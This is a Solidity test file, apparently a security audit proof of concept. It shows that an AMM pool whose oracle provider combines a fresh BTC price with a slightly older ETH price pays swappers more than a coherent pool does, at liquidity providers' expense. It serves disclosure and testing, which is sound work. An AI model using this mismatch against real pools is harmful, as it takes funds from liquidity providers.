// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "../contracts/MetricOmmPool.sol";
import {BinState} from "../contracts/types/PoolStorage.sol";
import {FaithfulAnchorOracle, FaithfulAnchoredPriceProvider} from "./mocks/FaithfulAnchor.sol";

/// @notice End-to-end PoC for composing two individually fresh oracle legs from different times.
///         The vulnerable pool uses BTC(t1) / ETH(t0), while the control pool uses
///         BTC(t1) / ETH(t1). Both legs pass the provider's independent staleness checks.
contract MetricOmmPoolAnchorTimestampMismatchPoC is MetricOmmPoolBaseTest {
  bytes32 internal constant BTC_USD = keccak256("BTC/USD");
  bytes32 internal constant ETH_USD_OLD = keccak256("ETH/USD-old");
  bytes32 internal constant ETH_USD_CURRENT = keccak256("ETH/USD-current");

  uint256 internal constant MIN_MARGIN = 5e13; // 0.5 bps
  uint256 internal constant MAX_STALENESS = 60;
  uint16 internal constant MAX_SPREAD_BPS = 300;

  uint256 internal constant BTC_NOW = 65_000 * 1e8;
  uint256 internal constant ETH_OLD = 3_000 * 1e8;
  uint256 internal constant ETH_NOW = 3_030 * 1e8;
  uint256 internal constant T0 = 1_700_000_000;

  FaithfulAnchorOracle internal anchorOracle;
  MetricOmmPool internal mixedTimePool;
  MetricOmmPool internal coherentPool;

  function setUp() public override {
    super.setUp();
    vm.warp(T0);

    anchorOracle = new FaithfulAnchorOracle();
    anchorOracle.setFeed(BTC_USD, BTC_NOW, 1, 0, block.timestamp);
    anchorOracle.setFeed(ETH_USD_OLD, ETH_OLD, 1, 0, block.timestamp - 5);
    anchorOracle.setFeed(ETH_USD_CURRENT, ETH_NOW, 1, 0, block.timestamp);

    FaithfulAnchoredPriceProvider mixedTimeProvider = _provider(ETH_USD_OLD);
    FaithfulAnchoredPriceProvider coherentProvider = _provider(ETH_USD_CURRENT);

    mixedTimePool = _deployAnchorPool(address(mixedTimeProvider));
    coherentPool = _deployAnchorPool(address(coherentProvider));
    _approveUsersForPool(address(mixedTimePool));
    _approveUsersForPool(address(coherentPool));

    // Give both pools identical two-bin liquidity and a low, non-zero protocol fee.
    pool = mixedTimePool;
    _addLiquidity(1, -1, 0, 100_000e18, 1);
    pool = coherentPool;
    _addLiquidity(1, -1, 0, 100_000e18, 2);
  }

  function test_mixedTimestampRatioPaysAttackerMoreThanCoherentRatio() public {
    uint128 amountIn = 100e18;

    (int256 mixedAmount0, int256 mixedAmount1) =
      _swapOnPool(address(mixedTimePool), 0, users[0], true, _i128ExactIn(amountIn), 0);
    (int256 fairAmount0, int256 fairAmount1) =
      _swapOnPool(address(coherentPool), 0, users[0], true, _i128ExactIn(amountIn), 0);

    assertEq(mixedAmount0, fairAmount0, "same token0 input");
    uint256 mixedOutput = uint256(-mixedAmount1);
    uint256 fairOutput = uint256(-fairAmount1);
    assertGt(mixedOutput, fairOutput, "mixed-time ratio overpays token1");

    uint256 excessBps = (mixedOutput - fairOutput) * 10_000 / fairOutput;
    assertGt(excessBps, 90, "LP loss is approximately the denominator's 1% move");
  }

  function _provider(bytes32 quoteFeed) internal returns (FaithfulAnchoredPriceProvider) {
    return new FaithfulAnchoredPriceProvider(
      address(anchorOracle),
      BTC_USD,
      quoteFeed,
      MIN_MARGIN,
      MAX_STALENESS,
      MAX_SPREAD_BPS,
      address(token0),
      address(token1)
    );
  }

  function _deployAnchorPool(address priceProvider) internal returns (MetricOmmPool deployedPool) {
    (BinState[] memory nonNegative, BinState[] memory negative) = _defaultBinStateArrays();
    deployedPool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: priceProvider,
        extensions: _emptyExtensions(),
        extensionOrders: _emptyExtensionOrders(),
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 10, // 0.001%
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 0,
        nonNegativeBinStates: nonNegative,
        negativeBinStates: negative,
        protocolNotionalFeeE8: 0,
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: priceProvider,
        lowestBin: -1,
        highestBin: 0
      })
    );
  }
}
